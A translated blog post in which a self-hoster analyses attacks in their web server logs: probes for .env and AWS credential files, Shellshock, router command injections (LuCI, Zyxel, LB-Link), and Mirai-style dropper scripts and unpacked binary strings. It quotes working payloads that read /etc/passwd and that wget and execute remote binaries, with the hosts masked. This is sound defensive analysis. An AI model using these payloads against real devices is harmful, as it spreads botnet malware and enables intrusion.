<!--yml

类别：未分类

日期：2024-05-27 15:16:57

-->

# 我查看了我的访问日志中的攻击。 这是我找到的

> 来源：[`nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/`](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)

我已经自行托管了十多年了。 这是自由的，因为我拥有自己的数据，并且不依赖于除了我的云主机之外的任何平台，我可以轻松关闭它。 自行托管可以深入了解运行云服务所需的内容。 任何有过这样练习的人可能都会告诉您，互联网是一个危险的地方。

将任何 IP 暴露在公共互联网上立即会引来大量恶意流量。 尽管这是不可取的，但是通过这些流量我们可以学到很多东西，所以我翻阅了我的访问日志，看看我最近遭受了哪些攻击。

> 注意：我不是安全专家。 我只是一个好奇的开发人员，喜欢研究，所以请对我做出的任何断言持保留态度。 我不确定隐藏坏人的 IP 地址的价值是什么，但我还是隐藏了它们，出于谨慎的考虑。 另外，我还隐藏了攻击者使用的一些更加色彩丰富的语言，其中包括脏话等低俗语言。

# 凭证和配置发现

最常见的攻击方式是目录遍历攻击，以寻找凭证。 最常见的似乎是寻找`.env`，通常包含应用程序的秘密。

```
[23/Jan/2024:03:41:01 +0000] 404 - GET http xxx.xxx.xxx.xxx "/laravel/.env" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" "-"

[23/Jan/2024:05:19:23 +0000] 404 - GET http xxx.xxx.xxx.xxx "/backend/.env" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"

[23/Jan/2024:06:07:05 +0000] 404 - GET http xxx.xxx.xxx.xxx "/api/.env" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"

[23/Jan/2024:06:11:20 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.env" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"

[25/Jan/2024:12:14:47 +0000] 404 - GET http xxx.xxx.xxx.xxx "//.env" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Go-http-client/1.1" "-" 
```

此外，攻击者正在寻找其他包含凭证的常见文件。 在我的示例中，他们似乎正在寻找 AWS 凭证和配置文件，以及 Git 仓库。

```
[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/aws.yml" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.env.bak" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/info.php" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.aws/credentials" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/config/aws.yml" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:12:10:17 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.git/config" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4859.172 Safari/537.36" "-" 
```

其他攻击似乎是在寻找可能被管理员意外暴露的常见目录。 我猜名称是根据常见名称进行猜测的。 我很想了解它们的成功率如何。 有趣的是，这些攻击的用户代理提到了`Mozlila/5.0`，据我所知，这是`Mozilla/5.0`的拼写错误。 在[GitHub](https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&type=code&ref=nishtahir.com)上的搜索（忽略试图阻止用户代理的结果）暗示这很可能是一个常见工具中的拼写错误，该工具已被复制并粘贴。

```
[22/Jan/2024:21:03:33 +0000] 404 - GET http xxx.xxx.xxx.xxx "/old/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:33 +0000] 404 - GET http xxx.xxx.xxx.xxx "/new/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:35 +0000] 404 - GET http xxx.xxx.xxx.xxx "/test/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:36 +0000] 404 - GET http xxx.xxx.xxx.xxx "/backup/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:36 +0000] 404 - GET http xxx.xxx.xxx.xxx "/temp/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-" 
```

攻击者似乎也在寻找常见的远程访问和配置工具。

```
[22/Jan/2024:15:43:25 +0000] 404 - GET http xxx.xxx.xxx.xxx "/actuator/gateway/routes" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"

[23/Jan/2024:00:14:28 +0000] 404 - GET http xxx.xxx.xxx.xxx "/hudson" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 zgrab/0.x" "-"

[23/Jan/2024:03:33:44 +0000] 400 - GET http xxx.xxx.xxx.xxx "/ui/login.action" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"

[23/Jan/2024:14:20:05 +0000] 200 - GET http xxx.xxx.xxx.xxx "/?XDEBUG_SESSION_START=phpstorm" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-" 
```

这里的教训似乎是尽量将绝对最少的内容暴露给公共互联网。 如果不需要，就不要暴露。 如果必须暴露工具或目录，请添加一些身份验证层，如果可能，请限制访问特定 IP 地址，因为恶意行为者将在寻找它。

# Shellshock

接下来，我们有一堆看起来正在利用 Shellshock 漏洞的攻击。

```
[24/Jan/2024:12:02:50 +0000] 200 - GET http xxx.xxx.xxx.xxx "/" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" 
```

此漏洞利用执行具有易受攻击的 bash 版本的 CGI 脚本的 Web 服务器，允许攻击者执行任意命令。当 CGI 程序启动时，它会使用请求的内容设置环境变量，值得注意的是`HTTP_USER_AGENT`。当包含字符`() { :; };`时，bash 解释为需要执行的函数。

在这次特定的攻击中，坏人将这个函数作为用户代理发送。

```
() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd 
```

让我们进一步分解。

1.  `() { ignored; };`：这部分在 Bash 中定义了一个函数。花括号内的内容是函数主体。忽略的命令是一个占位符；它不影响执行，但可能包含以防止语法错误。

1.  `echo Content-Type: text/html; echo ;`：这些命令是函数主体的一部分。它们将 HTTP 响应的 Content-Type 标题设定为"text/html"并回显一个空行。

1.  `/bin/cat /etc/passwd`：这是嵌入在函数中的恶意命令。它尝试使用`cat`命令显示`/etc/passwd`文件的内容，其中包含用户帐户信息。

如果攻击成功，攻击者理论上会获得我的用户凭据以及在服务器上执行任意代码的机制。

像目录遍历攻击一样，攻击者猜测常见的目录和路径，寻找响应良好的终点。

```
[24/Jan/2024:12:02:51 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/status" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:51 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/stats" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:52 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/test" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:52 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/status/status.cgi" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:53 +0000] 404 - GET http xxx.xxx.xxx.xxx "/test.cgi" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:53 +0000] 400 - GET http xxx.xxx.xxx.xxx "/debug.cgi" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:54 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/test-cgi" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" 
```

# LuCI 注入

```
[23/Jan/2024:17:26:43 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh)" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/xxx.xxx.xxx.xxx Safari/537.36" "-" 
```

这次我们发现的攻击似乎针对 OpenWRT 路由器的 LuCI Web 界面。该攻击尝试将一条命令注入到表单的国家字段中，以下载并执行托管在远程服务器上的 shell 脚本。让我们进一步分解。

URL 中的恶意代码已经进行了 URL 编码。解码 URL 会更容易阅读。

```
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh) 
```

分解一下，

1.  `/cgi-bin/luci/;stok=/locale`：这是 LuCI 界面中 CGI 脚本的路径。LuCI 是用于 OpenWRT 路由器和类似嵌入式设备的基于 Web 的接口。

1.  `?form=country&operation=write&country=`：这些是传递给 CGI 脚本的参数。

1.  `$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`：这是一个打算执行的 bash 替换命令，并且输出会被替换到 URL 中。该命令尝试进入`/tmp`文件夹，删除所有文件，从远程服务器下载一个 shell 脚本，并执行它。

> 请不要尝试我即将做的事情。在我调查的这一点上，我不知道脚本包含什么或者做什么。我正在冒险并采取措施保持自己安全。如果你不确定自己在做什么，尝试这样做可能会导致您的机器遭到攻击。

下载脚本以进一步调查，我发现攻击者的目标是下载并执行额外的二进制文件。

```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://xxx.xxx.xxx.xxx/mips; chmod +x lol; ./lol tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://xxx.xxx.xxx.xxx/mpsl; chmod +x lmao; ./lmao tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ██████ http://xxx.xxx.xxx.xxx/x86_64; chmod +x ██████; ./██████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ███ http://xxx.xxx.xxx.xxx/arm; chmod +x ███; ./███ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O █████ http://xxx.xxx.xxx.xxx/arm5; chmod +x █████; ./█████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ██████ http://xxx.xxx.xxx.xxx/arm6; chmod +x ██████; ./██████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████ http://xxx.xxx.xxx.xxx/arm7; chmod +x ████; ./████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████ http://xxx.xxx.xxx.xxx/i586; chmod +x ████; ./████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://xxx.xxx.xxx.xxx/i686; chmod +x kekw; ./kekw tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://xxx.xxx.xxx.xxx/powerpc; chmod +x what; ./what tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://xxx.xxx.xxx.xxx/sh4; chmod +x kys; ./kys tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████eater http://xxx.xxx.xxx.xxx/m68k; chmod +x ████eater; ./████eater tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://xxx.xxx.xxx.xxx/sparc; chmod +x blyat; ./blyat tplink 
```

二进制文件似乎是根据目标设备的架构命名的，这是有道理的，因为攻击者可能不知道设备运行的架构。这会给他们最大的工作表面。 （注：我对名称进行了审查，因为攻击者将二进制文件重命名为常见的侮辱性词汇）

我继续下载了一个与我的环境不兼容的二进制文件，作为一项额外的预防措施，并安装了 Ghidra 进行进一步的调查。查看二进制文件时，只有 3 个函数没有太多的字符串数据。但是，有一大段数据看起来是这样的。

```
 00107eb6 45              ??         45h    E
        00107eb7 43              ??         43h    C
        00107eb8 7c              ??         7Ch    |
        00107eb9 50              ??         50h    P
        00107eba 52              ??         52h    R
        00107ebb 4f              ??         4Fh    O
        00107ebc 54              ??         54h    T
        00107ebd 5f              ??         5Fh    _
        00107ebe 57              ??         57h    W
        00107ebf 52              ??         52h    R
        00107ec0 49              ??         49h    I
        00107ec1 54              ??         54h    T
        00107ec2 45              ??         45h    E
        00107ec3 20              ??         20h
        00107ec4 66              ??         66h    f
        00107ec5 61              ??         61h    a
        00107ec6 69              ??         69h    i
        00107ec7 6c              ??         6Ch    l
        00107ec8 65              ??         65h    e
        00107ec9 64              ??         64h    d
        00107eca 2e              ??         2Eh    .
        00107ecb 0a              ??         0Ah
        00107ecc 00              ??         00h
        00107ecd 0a              ??         0Ah
        00107ece 00              ??         00h
        00107ecf 24 49 6e        ds         "$Info: This file is packed with the UPX executable packer http://upx.sf.net
                 66 6f 3a
                 20 54 68
        00107f1e 24 49 64        ds         "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All rights reserved
                 3a 20 55
                 50 58 20
        00107f6a 90              ??         90h
        00107f6b 90              ??         90h 
```

这一部分引人注目，表明它是一个嵌入式 ELF 二进制文件，已使用 [UPX](https://github.com/upx/upx?ref=nishtahir.com) 进行打包。一些快速研究表明，这经常被恶意软件作者滥用，用于混淆和压缩他们的二进制文件。只要恶意软件作者没有修改 UPX 标头或打包的二进制文件，我们应该能够使用 UPX 解包二进制文件。

```
root:~# upx -d mips
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     93732 <-     34932   37.27%   linux/mips    mips 
```

成功！这次我们有更多字符串可以查看，这使得恶意软件的意图更加清晰。

```
\x%02x
SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr
M-SEARCH * HTTP/1.1
HOST: xxx.xxx.xxx.xxx:1900
MAN: "ssdp:discover"
MX: 1
ST: urn:dial-multiscreen-org:service:dial:1
USER-AGENT: Google Chrome/60.0.3112.90 Windows

service:service-agent
 default
local
    TeamSpeak

Windows XP
nickname
<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Connection: keep-alive
Accept: */*
Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
Content-Length:
%s/%s
██████ got malware'd 
```

这次引人注目的是带有 ST 标头的 M-SEARCH。这是一个寻找网络上支持 DIAL 协议的设备的 UPnP 命令。根据附带的 XML 负载，看起来恶意软件被编程为扫描网络上易受命令注入攻击的华为设备。这似乎已被确认为 Mirai 僵尸网络的一部分。

我尝试下载引用的 `yeye.mips`，但是当我尝试获取它时，文件似乎不可用。也许这个文件只在一天的某些时间可用，或者只对某些头或用户代理作出响应？在服务器上运行 `nmap` 显示只有 2 个开放端口。

```
nmap xxx.xxx.xxx.xxx
Nmap scan report for 25port.org (xxx.xxx.xxx.xxx)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE   Service
22/tcp  open    ssh
646/tcp filtered    ldp 
```

这就是这段旅程的终点。

# Zyxel 注入

```
[23/Jan/2024:17:56:29 +0000] 400 - GET http localhost "/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://xxx.xxx.xxx.xxx/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] "-" "-" 
```

这次我们在 GET 请求的 URL 中有一个 shell 命令。该命令包含一堆`${IFS}` shell 替换，我们可以清理一下以便阅读。

```
/bin/zhttpd/ cd /tmp; rm -rf *mips*; wget http://xxx.xxx.xxx.xxx/huhu.mips; chmod 777 huhu.mips; ./huhu.mips zyxel.selfrep; 
```

这似乎是在利用 `zhttpd`，一个快速搜索指出它是 Zyxel 设备中可用的漏洞利用。与先前的漏洞利用类似，我决定下载二进制文件并在 Ghidra 中查看。幸运的是，这次二进制文件没有被打包，因此我们可以看到其中包含的字符串，以便了解它的意图。

浏览字符串时，有几个项目引人注目。

```
004266a4    SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr  "SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr"    ds
004266c8    M-SEARCH * HTTP/1.1
HOST: xxx.xxx.xxx.xxx:1900
MAN: "ssdp:discover"
MX: 1
ST: urn:dial-multiscreen-org:service:dial:1
USER-AGENT: Google Chrome/60.0.3112.90 Windows

    "M-SEARCH * HTTP/1.1\r\nHOST: xxx.xxx.xxx.xxx:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: urn:dial-multiscreen-org:service:dial:1\r\nUSER-AGENT: Google Chrome/60.0.3112.90 Windows\r\n\r\n" ds

...

00426fd0    HTTP/1.1 200 OK "HTTP/1.1 200 OK"   ds
00426fe0    skyljne.arm "skyljne.arm"   ds
00426fec    skyljne.arm5    "skyljne.arm5"  ds
00426ffc    skyljne.arm6    "skyljne.arm6"  ds
0042700c    skyljne.arm7    "skyljne.arm7"  ds
0042701c    skyljne.mips    "skyljne.mips"  ds
0042702c    skyljne.mpsl    "skyljne.mpsl"  ds
0042703c    skyljne.x86_64  "skyljne.x86_64"    ds
0042704c    skyljne.sh4 "skyljne.sh4"   ds
00427058    <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>    "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"  ds
00427234    POST /ctrlt/DeviceUpgrade_1 HTTP/1.1 
```

另一个 DIAL 协议扫描。寻找易受攻击的华为设备，试图下载 `huhu.mips`，可能是一种自我复制的形式。

```
0042763c    POST /goform/set_LimitClient_cfg HTTP/1.1
Cookie: user=admin

time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm *mpsl*;

    "POST /goform/set_LimitClient_cfg HTTP/1.1\r\nCookie: user=admin\r\n\r\ntime1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm *mpsl*;\r\n\r\n" ds 
```

另一个显著的是这个命令，根据 Akamai 的[这篇](https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com)文章，似乎是针对路由器的。

> 要利用此漏洞，攻击者可以向“/goform/set_LimitClient_cfg”URL 发送以下 HTTP POST 请求：
> 
> ...
> 
> 确保“Cookie”头设置为“user=admin”，因为程序没有针对身份验证或授权的特殊检查。这意味着在利用漏洞之前不需要进行先前的身份验证。

到目前为止，我们可以得出结论，这很可能是 Mirai 僵尸网络的代理。然而，一些消息来源还提到它可能与 Linux Medusa 有关。

# 结论

这只是我日志的皮毛。每天都有数十种其他的攻击尝试，我可以浏览，但这篇文章已经够长了。

这一经历确实突显了保持设备，特别是物联网设备的重要性，并尽可能将它们远离公共互联网。如果它们必须暴露在外，尽量将它们隔离到自己的虚拟局域网中。
